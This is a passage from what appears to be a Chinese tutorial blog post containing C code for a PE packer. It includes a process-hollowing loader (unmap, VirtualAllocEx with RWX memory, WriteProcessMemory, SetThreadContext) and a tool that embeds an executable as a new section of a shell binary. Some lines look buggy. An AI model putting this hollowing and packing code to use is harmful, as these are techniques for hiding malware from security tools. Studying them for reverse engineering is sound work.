pi.hThread);仅用于验证是否成功创建进程</span><br>CONTEXT contx;<br>contx.ContextFlags = CONTEXT_FULL;<br>GetThreadContext(pi.hThread, &amp;contx);<br><span class="hljs-comment">//int x = GetLastError();</span><br><span class="hljs-comment">//printf(&quot;%d\n&quot;, x);</span><br>DWORD dwEntryPoint = contx.Eax;<br>DWORD baseAddress;<br>TCHAR szBuffer[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>ReadProcessMemory(pi.hProcess, (LPCVOID)(contx.Ebx + <span class="hljs-number">8</span>), (LPVOID)&amp;baseAddress, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//printf(&quot;挂起进程的线程Context.Eax:%p - Context.Ebx + 8:%p\n&quot;, contx.Eax, baseAddress);</span><br><span class="hljs-keyword">int</span>* fileImageBase;<br>fileImageBase = (<span class="hljs-keyword">int</span>*)szBuffer;<br>DWORD shellImageBase = *fileImageBase;<br>UnloadShell(pi.hProcess, shellImageBase);<br>LPVOID p = AllocShellSize(argv[<span class="hljs-number">0</span>], pi.hProcess, encryptFileBuffer);<br>DWORD pEncryptImageSize = <span class="hljs-number">0</span>;<br>LPVOID pEncryptImageBuffer = FileBufferToImageBuffer((BYTE*)encryptFileBuffer, pEncryptImageSize);<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> old;<br>WriteProcessMemory(pi.hProcess, (<span class="hljs-keyword">void</span>*)(contx.Ebx + <span class="hljs-number">8</span>), &amp;p, <span class="hljs-keyword">sizeof</span>(DWORD), &amp;old);<br><br><span class="hljs-keyword">if</span> (WriteProcessMemory(pi.hProcess, p, pEncryptImageBuffer, pEncryptImageSize, &amp;old))<br>&#123;<br><br>DWORD encryptFileOEP = <span class="hljs-number">0</span>;<br>DWORD encryptFileImageBase = <span class="hljs-number">0</span>;<br><br>GetEncryptFileContext(encryptFileBuffer, encryptFileOEP, encryptFileImageBase);<br><br>contx.ContextFlags = CONTEXT_FULL;<br><br>contx.Eax = encryptFileOEP + (DWORD)p;<br><span class="hljs-comment">//contx.Eip</span><br>SetThreadContext(pi.hThread, &amp;contx);<br><br>LPVOID szBufferTemp = <span class="hljs-built_in">malloc</span>(pEncryptImageSize);<br><span class="hljs-built_in">memset</span>(szBufferTemp, <span class="hljs-number">0</span>, pEncryptImageSize);<br>ReadProcessMemory(pi.hProcess, p, szBufferTemp, pEncryptImageSize, <span class="hljs-literal">NULL</span>);<br>ResumeThread(pi.hThread);<br>CloseHandle(pi.hThread);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">UnloadShell</span><span class="hljs-params">(HANDLE ProcHnd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> BaseAddr)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-title">long</span><span class="hljs-params">(__stdcall* pfZwUnmapViewOfSection)</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)</span></span>;<br>pfZwUnmapViewOfSection ZwUnmapViewOfSection = <span class="hljs-literal">NULL</span>;<br>BOOL res = FALSE;<br>HMODULE m = LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (m) &#123;<br>ZwUnmapViewOfSection = (pfZwUnmapViewOfSection)GetProcAddress(m, <span class="hljs-string">&quot;ZwUnmapViewOfSection&quot;</span>);<br><br><span class="hljs-keyword">if</span> (ZwUnmapViewOfSection)<br>res = (ZwUnmapViewOfSection((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)ProcHnd, BaseAddr) == <span class="hljs-number">0</span>);<br>FreeLibrary(m);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;load library failed!!!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-function">LPVOID <span class="hljs-title">FileBufferToImageBuffer</span><span class="hljs-params">(BYTE* decodebuffer, DWORD&amp; size)</span></span><br><span class="hljs-function"></span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS pNTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER pPEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER pSectionHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER pSectionHeader_LAST = <span class="hljs-literal">NULL</span>;<br><br><br>pDosHeader = (PIMAGE_DOS_HEADER)decodebuffer;<br>pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)decodebuffer + pDosHeader-&gt;e_lfanew);<br>pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + <span class="hljs-number">4</span>);<br>pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);<br>pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pPEHeader-&gt;SizeOfOptionalHeader);<br>pSectionHeader_LAST = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader + (pPEHeader-&gt;NumberOfSections - <span class="hljs-number">1</span>) * <span class="hljs-number">40</span>);<br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fileLength = pSectionHeader_LAST-&gt;PointerToRawData + pSectionHeader_LAST-&gt;SizeOfRawData;<br>size = pNTHeader-&gt;OptionalHeader.SizeOfImage;<br>BYTE* pEncryptBuffer = (BYTE*)<span class="hljs-built_in">malloc</span>(size);<br><span class="hljs-built_in">memset</span>(pEncryptBuffer, <span class="hljs-number">0</span>, size);<br><span class="hljs-built_in">memcpy</span>(pEncryptBuffer, decodebuffer, pNTHeader-&gt;OptionalHeader.SizeOfHeaders);<br><span class="hljs-keyword">int</span> i;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; pNTHeader-&gt;FileHeader.NumberOfSections; i++)<br>&#123;<br><span class="hljs-built_in">memcpy</span>(pEncryptBuffer + pSectionHeader-&gt;VirtualAddress, decodebuffer + pSectionHeader-&gt;VirtualAddress, pSectionHeader-&gt;SizeOfRawData);<br>pSectionHeader++;<br>&#125;<br><br><br><span class="hljs-keyword">return</span> pEncryptBuffer;<br>&#125;<br><span class="hljs-function">LPVOID <span class="hljs-title">GetLastSecData</span><span class="hljs-params">(LPSTR lpszFile, DWORD&amp; fileSize)</span></span><br><span class="hljs-function"></span>&#123;<br>FILE* a = fopen(lpszFile, <span class="hljs-string">&quot;rb&quot;</span>);<br>fseek(a, <span class="hljs-number">0</span>, SEEK_END);<br>fileSize = ftell(a);<br>fseek(a, <span class="hljs-number">0</span>, SEEK_SET);<br>LPVOID pFileBuffer = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, fileSize);<br>fread(pFileBuffer, fileSize, <span class="hljs-number">1</span>, a);<br>fclose(a);<br><span class="hljs-keyword">if</span> (!pFileBuffer)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;文件读取失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><br>PIMAGE_DOS_HEADER pDosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS pNTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER pPEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER pSectionHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER pSectionHeader_LAST = <span class="hljs-literal">NULL</span>;<br><br><br>pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;<br>pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);<br>pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + <span class="hljs-number">4</span>);<br>pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);<br>pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pPEHeader-&gt;SizeOfOptionalHeader);<br>pSectionHeader_LAST = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader + (pPEHeader-&gt;NumberOfSections - <span class="hljs-number">1</span>) * <span class="hljs-number">40</span>);<br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fileLength = pSectionHeader_LAST-&gt;PointerToRawData + pSectionHeader_LAST-&gt;SizeOfRawData;<br>fileSize = pSectionHeader_LAST-&gt;SizeOfRawData;<br>LPVOID pEncryptBuffer = <span class="hljs-built_in">malloc</span>(fileSize);<br><span class="hljs-built_in">memset</span>(pEncryptBuffer, <span class="hljs-number">0</span>, fileSize);<br>CHAR* pNew = (CHAR*)pEncryptBuffer;<br><br>CHAR* pOld = (CHAR*)((DWORD)pFileBuffer + pSectionHeader_LAST-&gt;PointerToRawData);<br><br>pEncryptBuffer = pOld;<br><br><span class="hljs-keyword">return</span> pEncryptBuffer;<br>&#125;<br><span class="hljs-function">LPVOID <span class="hljs-title">AllocShellSize</span><span class="hljs-params">(LPSTR shellDirectory, HANDLE shellProcess, LPVOID encryptFileBuffer)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">void</span>* (__stdcall* pfVirtualAllocEx)(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>, <span class="hljs-keyword">void</span>*, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>);<br>pfVirtualAllocEx MyVirtualAllocEx = <span class="hljs-literal">NULL</span>;<br>MyVirtualAllocEx = (pfVirtualAllocEx)GetProcAddress(GetModuleHandle((LPCWSTR)<span class="hljs-string">&quot;Kernel32.dll&quot;</span>), <span class="hljs-string">&quot;VirtualAllocEx&quot;</span>); <span class="hljs-comment">//获取VirtualAllocEx 函数地址</span><br>FILE* a = fopen(shellDirectory, <span class="hljs-string">&quot;rb&quot;</span>);<br>fseek(a, <span class="hljs-number">0</span>, SEEK_END);<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fileSize = ftell(a);<br>fseek(a, <span class="hljs-number">0</span>, SEEK_SET);<br>LPVOID pShellBuffer = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, fileSize);<br>fread(pShellBuffer, fileSize, <span class="hljs-number">1</span>, a);<br>fclose(a);<br><br>DWORD shellImageBase = <span class="hljs-number">0</span>;<br>DWORD shellImageSize = <span class="hljs-number">0</span>;<br>DWORD encryptImageBase = <span class="hljs-number">0</span>;<br>DWORD encryptImageSize = <span class="hljs-number">0</span>;<br><br><br>GetNtHeaderInfo(pShellBuffer, shellImageBase, shellImageSize);<br>GetNtHeaderInfo(encryptFileBuffer, encryptImageBase, encryptImageSize);<br><br><span class="hljs-keyword">if</span> (shellImageBase == <span class="hljs-number">0</span> || shellImageSize == <span class="hljs-number">0</span> || encryptImageBase == <span class="hljs-number">0</span> || encryptImageSize == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;分配空间失败\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-keyword">void</span>* p = <span class="hljs-literal">NULL</span>;<br><br><br><span class="hljs-keyword">if</span> (shellImageBase == encryptImageBase)<br>&#123;<br>shellImageSize = (shellImageSize &gt;= encryptImageSize) ? shellImageSize : encryptImageSize;<br><br>p = VirtualAllocEx(shellProcess, (<span class="hljs-keyword">void</span>*)shellImageBase, shellImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><span class="hljs-comment">//int x = GetLastError();</span><br><span class="hljs-comment">//printf(&quot;%d\n&quot;, x);</span><br>&#125;<br><br><br><span class="hljs-keyword">if</span> (p == <span class="hljs-literal">NULL</span>)<br>&#123;<br>p = VirtualAllocEx(shellProcess, <span class="hljs-literal">NULL</span>, encryptImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><span class="hljs-keyword">if</span> (p) <br>&#123;<br><span class="hljs-keyword">return</span> p;<br><span class="hljs-comment">//DoRelocation(encryptFileBuffer, (void*)encryptImageBase, p);</span><br>&#125;<br><span class="hljs-keyword">else</span> <br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;分配空间失败\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br><br><br><span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">DoRelocation</span><span class="hljs-params">(LPVOID pFileBuffer, <span class="hljs-keyword">void</span>* OldBase, <span class="hljs-keyword">void</span>* NewBase)</span></span><br><span class="hljs-function"></span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i,j=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* t;<br>pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;<br>PIMAGE_NT_HEADERS peH = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);<br><span class="hljs-keyword">signed</span> <span class="hljs-keyword">long</span> Delta = (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">long</span>)NewBase - peH-&gt;OptionalHeader.ImageBase;<br>IMAGE_DATA_DIRECTORY relocations = (peH-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);<br>PIMAGE_BASE_RELOCATION p = (PIMAGE_BASE_RELOCATION)((DWORD)pFileBuffer + relocations.VirtualAddress);<br><span class="hljs-keyword">while</span> (p-&gt;VirtualAddress + p-&gt;SizeOfBlock)<br>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>* pw = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>*)((<span class="hljs-keyword">int</span>)p + <span class="hljs-keyword">sizeof</span>(*p));<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; (p-&gt;SizeOfBlock - <span class="hljs-keyword">sizeof</span>(*p)) / <span class="hljs-keyword">sizeof</span>(WORD); ++i)<br>&#123;<br><span class="hljs-keyword">if</span> (((*pw) &amp; <span class="hljs-number">0xF000</span>) == <span class="hljs-number">0x3000</span>) &#123;<br>t = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>*)((DWORD)(pFileBuffer)+p-&gt;VirtualAddress + ((*pw) &amp; <span class="hljs-number">0x0FFF</span>));<br>*t += Delta;<br>&#125;<br>++pw;<br>&#125;<br>p = (PIMAGE_BASE_RELOCATION)pw;<br>&#125;<br>&#125;<br><br><span class="hljs-function">VOID <span class="hljs-title">GetNtHeaderInfo</span><span class="hljs-params">(LPVOID pFileBuffer, DWORD&amp; ImageBase, DWORD&amp; ImageSize)</span></span><br><span class="hljs-function"></span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS pNTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER pPEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER pSectionHeader = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span> (!pFileBuffer)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;文件读取失败\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;不是有效的MZ标志\n&quot;</span>);<br><span class="hljs-built_in">free</span>(pFileBuffer);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><br>pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;<br><br><br><span class="hljs-keyword">if</span> (*((PDWORD)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;不是有效的PE标志\n&quot;</span>);<br><span class="hljs-built_in">free</span>(pFileBuffer);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);<br><br><br>pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + <span class="hljs-number">4</span>);<br><br><br>pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);<br><br>ImageBase = pOptionHeader-&gt;ImageBase;<br>ImageSize = pOptionHeader-&gt;SizeOfImage;<br><br>&#125;<br><br><span class="hljs-function">VOID <span class="hljs-title">GetEncryptFileContext</span><span class="hljs-params">(LPVOID pFileBuffer, DWORD&amp; OEP, DWORD&amp; ImageBase)</span></span><br><span class="hljs-function"></span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS pNTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER pPEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER pSectionHeader = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//pFileBuffer= ReadPEFile(lpszFile);</span><br><br><span class="hljs-keyword">if</span> (!pFileBuffer)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;文件读取失败\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;不是有效的MZ标志\n&quot;</span>);<br><span class="hljs-built_in">free</span>(pFileBuffer);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;<br><br><br><span class="hljs-keyword">if</span> (*((PDWORD)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;不是有效的PE标志\n&quot;</span>);<br><span class="hljs-built_in">free</span>(pFileBuffer);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);<br><br><br>pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + <span class="hljs-number">4</span>);<br><br><br>pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);<br><br><br>OEP = pOptionHeader-&gt;AddressOfEntryPoint;<br>ImageBase = pOptionHeader-&gt;ImageBase;<br><br>&#125;<br><br><br><br></code></pre></td></tr></table></figure><h1 id="encode-shell"><a href="#encode-shell" class="headerlink" title="encode-shell"></a>encode-shell</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><code class="hljs c">﻿<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function">LPVOID <span class="hljs-title">FileBufferToImageBuffer</span><span class="hljs-params">(BYTE* decodebuffer, DWORD&amp; size)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE* a;<br>    FILE* b;<br>    FILE* c;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> shelladdr[] = <span class="hljs-string">&quot;C:\\Users\\pisanbao\\Desktop\\decode_shell.exe&quot;</span>;<span class="hljs-comment">//shell路径</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> srcaddr[] = <span class="hljs-string">&quot;C:\\Users\\pisanbao\\Desktop\\thread_func.exe&quot;</span>;<span class="hljs-comment">//src路径</span><br>    a = fopen(srcaddr, <span class="hljs-string">&quot;rb&quot;</span>);<br>    fseek(a, <span class="hljs-number">0</span>, SEEK_END);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> filesize = ftell(a);<br>    fseek(a, <span class="hljs-number">0</span>, SEEK_SET);<br>    DWORD* filebuffer = (DWORD *)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, filesize);<br>    fread(filebuffer, filesize, <span class="hljs-number">1</span>, a);<br>    fclose(a);<br>    <span class="hljs-comment">// file buffer get</span><br>    IMAGE_DOS_HEADER* filedosheader = (IMAGE_DOS_HEADER*)filebuffer;<br>    IMAGE_NT_HEADERS* filentheader = (IMAGE_NT_HEADERS*)((BYTE*)filebuffer + filedosheader-&gt;e_lfanew);<br>    IMAGE_SECTION_HEADER* filesection = (IMAGE_SECTION_HEADER*)((BYTE*)filebuffer + filedosheader-&gt;e_lfanew + <span class="hljs-number">4</span> + <span class="hljs-keyword">sizeof</span>(IMAGE_FILE_HEADER) + filentheader-&gt;FileHeader.SizeOfOptionalHeader+<span class="hljs-number">40</span>*(filentheader-&gt;FileHeader.NumberOfSections<span class="hljs-number">-1</span>));<br>    filesize = filesection-&gt;PointerToRawData + filesection-&gt;SizeOfRawData;<br>    b = fopen(shelladdr, <span class="hljs-string">&quot;rb&quot;</span>);<br>    fseek(b, <span class="hljs-number">0</span>, SEEK_END);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> shellsize = ftell(b);<br>    fseek(b, <span class="hljs-number">0</span>, SEEK_SET);<br>    DWORD* shellbuffer = (DWORD*)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, shellsize);<br>    fread(shellbuffer, shellsize, <span class="hljs-number">1</span>, b);<br>    fclose(b);<br>    <span class="hljs-comment">//shell buffer get</span><br>    c = fopen(<span class="hljs-string">&quot;C:\\Users\\pisanbao\\Desktop\\shell.exe&quot;</span>, <span class="hljs-string">&quot;ab+&quot;</span>);<br>    IMAGE_DOS_HEADER * shelldosheader = (IMAGE_DOS_HEADER *)shellbuffer;<br>    IMAGE_NT_HEADERS* shellntheader = (IMAGE_NT_HEADERS*)((BYTE *)shellbuffer + shelldosheader-&gt;e_lfanew);<br>    IMAGE_SECTION_HEADER * shellsection = (IMAGE_SECTION_HEADER *)((BYTE*)shellbuffer + shelldosheader-&gt;e_lfanew + <span class="hljs-number">4</span> + <span class="hljs-keyword">sizeof</span>(IMAGE_FILE_HEADER) + shellntheader-&gt;FileHeader.SizeOfOptionalHeader);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; shellntheader-&gt;FileHeader.NumberOfSections; i++)<br>        shellsection++;<br>    WORD temp = shelldosheader-&gt;e_lfanew;<br>    DWORD tempsize = shellntheader-&gt;OptionalHeader.SizeOfHeaders;<br>    shelldosheader-&gt;e_lfanew = <span class="hljs-keyword">sizeof</span>(IMAGE_DOS_HEADER);    <br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> realimage = filesize;<br><br>    <span class="hljs-keyword">if</span> (filesize % <span class="hljs-number">0x1000</span>)<br>    &#123;<br>        realimage = ((filesize / <span class="hljs-number">0x1000</span>) + <span class="hljs-number">1</span>) * <span class="hljs-number">0x1000</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        realimage = filesize;<br>    &#125;<br>    <span class="hljs-comment">//unsigned long long tempimage = shellntheader-&gt;OptionalHeader.SizeOfImage;</span><br>    <span class="hljs-built_in">strcpy</span>((<span class="hljs-keyword">char</span> *)shellsection-&gt;Name,<span class="hljs-string">&quot;.psb&quot;</span>);<span class="hljs-comment">//特征名</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> count1;<br>    <span class="hljs-keyword">if</span> (filesize % <span class="hljs-number">0x200</span>)<br>    &#123;<br>        count1 = ((filesize / <span class="hljs-number">0x200</span>) + <span class="hljs-number">1</span>) * <span class="hljs-number">0x200</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        count1 = filesize;<br>    &#125;<br>    <span class="hljs-comment">//新增节主要注意的是要把新增的pe当作一段数据来看</span><br>    IMAGE_SECTION_HEADER* tempsection = shellsection;<br>    tempsection--;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> temptemp;<br>    DWORD imgsize = 